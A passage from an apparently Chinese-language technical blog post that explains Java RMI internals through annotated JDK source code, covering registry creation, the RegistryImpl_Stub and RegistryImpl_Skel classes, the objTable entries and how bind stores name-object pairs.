function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="comment">// 使用“固定 ObjID（REGISTRY_ID）+ 指定端口”构造 LiveRef（活动引用）</span></span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 用 LiveRef 创建服务端远程引用（UnicastServerRef），并指定反序列化/入站过滤器</span></span><br><span class="line">                    <span class="comment">// registryFilter：用于校验入站数据/调用（JEP 290 风格的过滤器）</span></span><br><span class="line">                    setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, RegistryImpl::registryFilter));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">/* context */</span> <span class="literal">null</span>,</span><br><span class="line">            <span class="comment">/* 附加权限：仅限对 localhost:&lt;port&gt; 的监听与接收，最小化授权面 */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span> + port, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="comment">// 将特权块中出现的受检异常转换/抛出为 RemoteException</span></span><br><span class="line">            <span class="keyword">throw</span> (RemoteException) pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 非默认端口（或未启用 SecurityManager）：按常规路径初始化</span></span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, RegistryImpl::registryFilter));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>setup</code> 方法中，依旧是使用 <code>UnicastServerRef</code> 的 <code>exportObject</code> 方法导出对象，只不过这次 <code>export</code> 的是 <code>RegistryImpl</code> 这个对象（之前是远程对象的动态代理对象 <code>UnicastRemoteObject</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用传入的 UnicastServerRef（服务端远程引用）对当前远程对象进行初始化并导出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 1) 先“安装”服务端引用：</span></span><br><span class="line">    <span class="comment">//    必须在导出之前把 ServerRef 赋给当前远程对象（this.ref），</span></span><br><span class="line">    <span class="comment">//    这样导出流程里构造 Target、注册对象表、生成 stub 等步骤</span></span><br><span class="line">    <span class="comment">//    都能拿到正确的引用与传输配置。</span></span><br><span class="line">    <span class="built_in">this</span>.ref = uref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 执行真正的导出动作：</span></span><br><span class="line">    <span class="comment">//    - 第一个参数：当前远程对象（作为实现 impl）</span></span><br><span class="line">    <span class="comment">//    - 第二个参数：扩展数据（此处为 null）</span></span><br><span class="line">    <span class="comment">//    - 第三个参数：permanent=true，表示“永久导出”（通常不参与 DGC 的自动 unexport）</span></span><br><span class="line">    <span class="comment">//    导出过程中会：</span></span><br><span class="line">    <span class="comment">//      * 确保传输层开始监听</span></span><br><span class="line">    <span class="comment">//      * 创建/选择客户端 stub（动态代理或 RemoteStub）</span></span><br><span class="line">    <span class="comment">//      * 以 ObjID 注册到对象表（ObjectTable）</span></span><br><span class="line">    <span class="comment">//      * 使该对象可以接收远程调用</span></span><br><span class="line">    uref.exportObject(<span class="built_in">this</span>, <span class="comment">/* data */</span> <span class="literal">null</span>, <span class="comment">/* permanent */</span> <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在执行 <code>exportObject</code> 时，内部会调用 <code>createProxy</code> 选择代理实现；由于 <code>stubClassExists</code> 检测到待导出的 <code>RegistryImpl</code> 存在预生成存根 <code>sun.rmi.registry.RegistryImpl_Stub</code>，因此走 <code>createStub</code> 路径，返回该存根，而不是为 <code>RegistryImpl</code> 生成 JDK 动态代理。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定实现类选择“动态代理”或“预生成存根（RemoteStub）”并返回 Remote 代理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 选择规则（布尔化等价式）：</span></span><br><span class="line"><span class="comment"> *   useStub = forceStubUse || (!ignoreStubClasses &amp;&amp; stubClassExists(remoteClass))</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 含义：</span></span><br><span class="line"><span class="comment"> * - forceStubUse=true           → 强制走旧式 *_Stub 存根；</span></span><br><span class="line"><span class="comment"> * - 否则：若未忽略存根 且 确有 *_Stub → 走存根；</span></span><br><span class="line"><span class="comment"> * - 其余情况                    → 走 JDK 动态代理（Proxy + RemoteObjectInvocationHandler）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 例：对 RegistryImpl，JDK 自带 sun.rmi.registry.RegistryImpl_Stub，</span></span><br><span class="line"><span class="comment"> *     因此 stubClassExists(...) 为 true → 走 createStub(...)。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ... 省略：remoteClass = getRemoteClass(implClass) 等前置校验</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若强制使用存根，或确实存在 *_Stub 且未被配置为忽略存根，则创建 RemoteStub 实例</span></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">        !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则：构造 InvocationHandler 与接口数组，走动态代理路径</span></span><br><span class="line">    <span class="comment">// return Proxy.newProxyInstance(..., new RemoteObjectInvocationHandler(clientRef));</span></span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断“给定远程类”是否存在“预生成的存根类（*_Stub）”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 机制：</span></span><br><span class="line"><span class="comment"> * - 按约定尝试加载 &lt;远程类全名&gt; + &quot;_Stub&quot;；</span></span><br><span class="line"><span class="comment"> * - 成功则返回 true；</span></span><br><span class="line"><span class="comment"> * - 找不到则把该远程类放入负缓存 withoutStubs，避免后续重复探测，再返回 false。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> remoteClass 远程类（其接口需继承 java.rmi.Remote）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否存在 *_Stub 存根类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">    <span class="comment">// 负缓存未命中才去尝试加载，避免重复 Class.forName 带来的开销</span></span><br><span class="line">    <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 按老规约尝试：不初始化类（false），并使用与 remoteClass 相同的类加载器</span></span><br><span class="line">            Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                          <span class="comment">/* initialize = */</span> <span class="literal">false</span>,</span><br><span class="line">                          <span class="comment">/* loader = */</span> remoteClass.getClassLoader());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 成功加载，说明存在预生成存根</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            <span class="comment">// 记录负缓存：该远程类没有 *_Stub，后续直接返回 false</span></span><br><span class="line">            withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 负缓存命中或加载失败：视为不存在 *_Stub</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createStub</code> 函数通过反射将 <code>RegistryImpl_Stub</code> 类加载并实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为指定远程类创建并返回其“预生成存根（*_Stub）”实例，使用给定的 RemoteRef 初始化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 约定：</span></span><br><span class="line"><span class="comment"> * - 存根类命名为：&lt;远程类全名&gt; + &quot;_Stub&quot;；</span></span><br><span class="line"><span class="comment"> * - 存根类应当继承 RemoteStub，并提供单参构造：&lt;init&gt;(RemoteRef)。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 加载器选择：</span></span><br><span class="line"><span class="comment"> * - 使用 remoteClass 的类加载器加载 *_Stub（可能为 null＝引导类加载器）；</span></span><br><span class="line"><span class="comment"> * - 这样可确保存根与其远程接口处于同一可见性域，并满足 RMI 对“本地加载器”的要求：</span></span><br><span class="line"><span class="comment"> *   当通过 MarshalOutputStream/MarshalInputStream 进行编组（pickle）时，能够正确</span></span><br><span class="line"><span class="comment"> *   注解/传递代码来源信息给远端（历史行为，现代 JDK 常默认本地可用）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 失败会被包装为 StubNotFoundException。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RemoteStub <span class="title function_">createStub</span><span class="params">(Class&lt;?&gt; remoteClass, RemoteRef ref)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 依据命名约定拼出存根类名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">stubname</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 使用与 remoteClass 相同的类加载器加载 *_Stub（不触发静态初始化）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> remoteClass.getClassLoader(); <span class="comment">// 可能为 null（bootstrap）</span></span><br><span class="line">        Class&lt;?&gt; stubcl = Class.forName(stubname, <span class="comment">/* initialize */</span> <span class="literal">false</span>, cl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 取得期望的构造器（通常等于 new Class&lt;?&gt;[]&#123; RemoteRef.class &#125;）</span></span><br><span class="line">        Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 反射创建实例并返回</span></span><br><span class="line">        <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123; ref &#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后回到 <code>exportObject</code>，由于这时候是实例化的 <code>RemoteStub</code> 而不是创建远程对象的动态代理，因此会调用 <code>setSkeleton</code> 设置骨架。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果存根是 RemoteStub 的实例，设置骨架（Skeleton）</span></span><br><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">    setSkeleton(impl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>setSkeleton</code> 会调用 <code>Util.createSkeleton</code> 创建注册中心 <code>RegistryImpl</code> 的骨架类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定的远程实现对象查找并设置其“骨架（Skeleton）”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;说明：</span></span><br><span class="line"><span class="comment"> * - Skeleton 仅用于兼容 JDK 1.1 的旧式 RMI 协议（stub/skeleton 体系）。</span></span><br><span class="line"><span class="comment"> *   自 JDK 1.2 起服务端不再需要 skeleton；现代 RMI 依赖动态代理与服务端分发器。</span></span><br><span class="line"><span class="comment"> * - 因此：找不到 skeleton 不应视为错误；这里用一个负缓存（withoutSkeletons）</span></span><br><span class="line"><span class="comment"> *   记录“该类无 skeleton”，避免反复尝试加载。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> impl 远程对象实现实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 设置过程中出现底层远程错误（通常不会因“找不到 skeleton”而抛出）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote impl)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 若该实现类尚未被标记为“无 skeleton”，则尝试创建</span></span><br><span class="line">    <span class="keyword">if</span> (!withoutSkeletons.containsKey(impl.getClass())) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试按 &lt;RemoteClass&gt;_Skel 的命名约定创建旧式骨架</span></span><br><span class="line">            skel = Util.createSkeleton(impl);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SkeletonNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * JDK 1.2 及之后：骨架并非必需（动态代理/分发器取代了它）。</span></span><br><span class="line"><span class="comment">             * 因此忽略该异常，并把该类加入“无 skeleton”的负缓存，避免后续重复探测。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            withoutSkeletons.put(impl.getClass(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按旧式命名约定定位并返回给定远程对象的 Skeleton 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;流程：</span></span><br><span class="line"><span class="comment"> * 1) 确认远程类（实现了 Remote 的“最派生”实现类）；</span></span><br><span class="line"><span class="comment"> * 2) 按 &lt;RemoteClass&gt;_Skel 的命名约定，用相同类加载器尝试加载；</span></span><br><span class="line"><span class="comment"> * 3) 反射构造并返回实例。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：现代 JDK 通常不会生成 *_Skel，找不到应视为正常并抛出</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> SkeletonNotFoundException&#125; 供上层转入“无 skeleton”路径。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object 远程对象实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 与该对象匹配的 Skeleton</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SkeletonNotFoundException 找不到或无法构造 skeleton</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote object)</span> <span class="keyword">throws</span> SkeletonNotFoundException &#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; remoteClass;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取“远程类”基准（通常是实现了 Remote 的实现类）</span></span><br><span class="line">        remoteClass = getRemoteClass(object.getClass());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;no remote class for &quot;</span> + object.getClass().getName(), ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 旧式骨架命名：&lt;RemoteClass&gt;_Skel</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">skelName</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 用与远程类相同的类加载器加载，且不触发静态初始化</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> remoteClass.getClassLoader();</span><br><span class="line">        Class&lt;?&gt; skelClass = Class.forName(skelName, <span class="comment">/* initialize */</span> <span class="literal">false</span>, loader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 旧式实现常用无参构造；现代写法用反射新 API 更安全</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line">        <span class="type">Skeleton</span> <span class="variable">skel</span> <span class="operator">=</span> (Skeleton) skelClass.newInstance();</span><br><span class="line">        <span class="keyword">return</span> skel;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createSkeleton</code> 会根据传入的存根对象的类 <code>RegistryImpl_Stub</code> 找到对应的远程对象的类 <code>RegistryImpl</code>，然后通过名称拼接得到对应的骨架对象 <code>sun.rmi.registry.RegistryImpl_Skel</code> 并使用反射将其加载并实例化。</p>
<p>之后依旧是：</p>
<ol>
<li>封装 <code>target</code> 对象，将 <code>ResgitryImpl</code> 和 <code>RegistryImpl_Stub</code> 封装成 <code>Target</code>。</li>
<li><code>LiveRef#exportObject</code> 将 <code>target</code> 导出，开启监听端口。</li>
<li><code>putTarget</code> 将 <code>target</code> 放入 <code>objTable</code> 和 <code>implTable</code> 。</li>
</ol>
<p>完成远程对象创建和注册中心创建后，<code>objTable</code> 会有三个值：</p>
<ul>
<li><code>DGC</code> 垃圾回收：<code>stub</code> 为 <code>DGCImpl_Stub</code>，<code>skel</code> 为 <code>DGCImpl_Skel</code>。</li>
<li>创建的远程对象：<code>stub</code> 为远程对象的代理对象，<code>skel</code> 为  <code>null</code>。</li>
<li>注册中心：<code>stub</code> 为 <code>RegistryImpl_Stub</code>，<code>skel</code> 为 <code>RegistryImpl_Skel</code>。</li>
</ul>
<p>由上可知注册中心就是一个特殊的远程对象，和普通远程对象创建的差异：</p>
<ul>
<li><code>LiveRef</code> 的 <code>id</code> 为 0。</li>
<li>远程对象 <code>Stub</code> 为动态代理，注册中心的 <code>Stub</code> 为 <code>RegistryImpl_Stub</code>，同时还创建了<code>RegistryImpl_Skel</code>。</li>
<li>远程对象端口默认随机，注册中心端口默认 1099。</li>
</ul>
<p>总结一下注册中心创建的一些关键点：</p>
<ul>
<li><code>LocateRegistry#createRegistry</code> 用于创建注册中心 <code>RegistryImpl</code>。</li>
<li>注册中心是一个特殊的远程对象，对象 id 为 0。</li>
<li>导出时不会创建动态代理，而是找到 <code>RegistryImpl_Stub</code>，同时创建了对应的骨架 <code>RegistryImpl_Skel</code>，Stub 会被序列化传递给客户端，其重写了 <code>Registry</code> 的<code>lookup</code>、<code>bind</code> 等方法，会对传输和接收的数据流进行序列化和反序列化。</li>
<li>后面的 socket 端口监听、target 存储到 <code>objTables</code> 和远程对象的导出一致。</li>
</ul>
<h4 id="远程对象注册"><a href="#远程对象注册" class="headerlink" title="远程对象注册"></a>远程对象注册</h4><p>首先是直接使用 <code>RegistryImpl</code>的 <code>bind</code> 方法注册的方式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>createRegistry</strong> ：在当前 JVM 内 <code>new RegistryImpl(port)</code> → 调用 <code>setup(...).exportObject(...)</code> 把它导出 → <strong>把这个实现对象本身返回</strong>。你随后对 <code>registry.bind(...)</code> 的调用是<strong>本地方法调用</strong>，直接进 <code>RegistryImpl#bind</code>，把 <code>(name → obj)</code> 放进 <code>bindings</code>；不经过网络。</p>
</li>
<li><p><strong>getRegistry &#x2F; Naming.bind</strong> ：拿到的是<strong>客户端引用（stub&#x2F;动态代理）</strong>，对它调用 <code>bind(...)</code> 会经由 JRMP 走网络，到达远端的 <code>RegistryImpl#bind</code>。</p>
</li>
</ul>

    </div>
  </div>

<p>这里的 <code>bind</code> 方法实际上就是把 <code>name</code> 和 <code>obj</code> 放到 <code>bindings</code> 这个哈希表中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的远程对象与给定名称绑定到注册表中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> * - 若名称尚未被占用，则把 (name → obj) 放入注册表；否则抛 AlreadyBoundException。</span></span><br><span class="line"><span class="comment"> * - 该方法只做“登记”，不负责导出远程对象；通常应先对 obj 调用</span></span><br><span class="line"><span class="comment"> *   UnicastRemoteObject.exportObject(...) 获取可用的 stub，再绑定。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 要绑定的名称（不能为 null 或空串；为 null 将触发 NullPointerException）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  要绑定的远程对象（必须实现 java.rmi.Remote；为 null 将触发 NullPointerException）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException       远程调用路径上的通信错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AlreadyBoundException 名称已存在时抛出；若要覆盖请用 rebind(...)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException       访问被拒（例如远程调用方无权限进行 bind）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 